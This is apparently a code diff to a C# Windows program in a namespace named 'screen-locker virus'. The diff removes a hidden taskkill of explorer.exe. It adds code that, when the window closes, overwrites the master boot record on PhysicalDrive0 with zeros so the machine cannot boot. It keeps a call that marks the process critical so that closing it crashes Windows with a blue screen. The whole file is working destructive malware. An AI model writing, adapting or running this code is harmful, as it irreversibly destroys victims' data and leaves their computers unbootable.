@@ -26,48 +26,42 @@ namespace 锁机病毒
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            try
+            // 获取资源库设置好的 IsFirstRun 设置的值
+            int runtimes = Properties.Settings.Default.times;
+            if (runtimes == 2)
             {
-                //杀死explorer
-                Process process_CMD = new Process();
-                process_CMD.StartInfo.FileName = "cmd.exe";//进程打开文件名为“cmd”
-                process_CMD.StartInfo.RedirectStandardInput = true;//是否可以输入
-                process_CMD.StartInfo.RedirectStandardOutput = true;//是否可以输出
-                process_CMD.StartInfo.CreateNoWindow = true;//不创建窗体 也就是隐藏窗体
-                process_CMD.StartInfo.UseShellExecute = false;//是否使用系统shell执行，否
-
-                process_CMD.Start();
-
-                process_CMD.StandardInput.WriteLine("taskkill /im explorer.exe /t /f ");
+                label5.Text = "第二次打开，好玩么？";
             }
-            catch(Exception ex)
-            {
-                //错误处理
-            }
-
-            // 创建一个新的线程并开始执行
-            //进度条
-            Thread thread = new Thread(new ThreadStart(WorkerThread));
-            thread.Start();
+            //MessageBox.Show("窗体加载完毕");
         }
 
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-
-        }
-
-        private void WorkerThread()
-        {
-            for (int i = 0; i < 100; i++)
-            {
-                Thread.Sleep(10000);
-                progressBar1.Value = i;
-            }
-        }
-
+        
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
+
+                //清空MBR让计算机无法开机
+                // 读取 MBR
+                byte[] mbr = new byte[512];
+                using (FileStream stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open))
+                {
+                    stream.Read(mbr, 0, mbr.Length);
+                }
+
+                // 修改 MBR
+                for (int i = 0; i < mbr.Length; i++)
+                {
+                    mbr[i] = 0x00;
+                }
+
+                // 写入 MBR
+                using (FileStream stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open))
+                {
+                    stream.Write(mbr, 0, mbr.Length);
+                }
+            
+            
             //关闭窗体触发蓝屏
+            
             int isCritical = 1;  // we want this to be a Critical Process
             int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
 
@@ -75,6 +69,9 @@ namespace 锁机病毒
 
             // setting the BreakOnTermination = 1 for the current process
             NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+            
+
         }
+
     }
 }
